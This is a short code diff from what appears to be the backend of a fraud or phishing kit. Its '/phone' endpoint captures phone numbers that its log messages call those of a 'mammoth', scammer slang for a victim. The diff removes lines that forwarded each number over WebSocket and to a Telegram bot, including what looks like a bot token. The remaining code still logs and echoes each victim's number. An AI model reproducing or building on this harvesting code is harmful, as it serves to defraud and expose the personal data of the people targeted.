@@ -33,22 +33,6 @@ app.post('/phone', (req, res) => {
     if (typeof phone_number !== 'undefined') {
         pn = phone_number;
         console.log(`Номер телефона мамонта: ${phone_number}`);
-        
-        wss.clients.forEach(client => {
-            if (client.readyState === WebSocket.OPEN) {
-                client.send(JSON.stringify({ phoneNumber: phone_number }));
-            }
-        });
-        
-        const chatId = '6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI';
-        bot.sendMessage(chatId, `Номер телефона мамонта: ${phone_number}`)
-            .then(() => {
-                console.log('Сообщение успешно отправлено в телеграм.');
-            })
-            .catch((error) => {
-                console.error('Ошибка при отправке сообщения в телеграм:', error);
-            });
-
         res.json({ message: `Номер телефона мамонта: ${phone_number}` });
     } else {
         console.log('Номер телефона мамонта неопределен.');
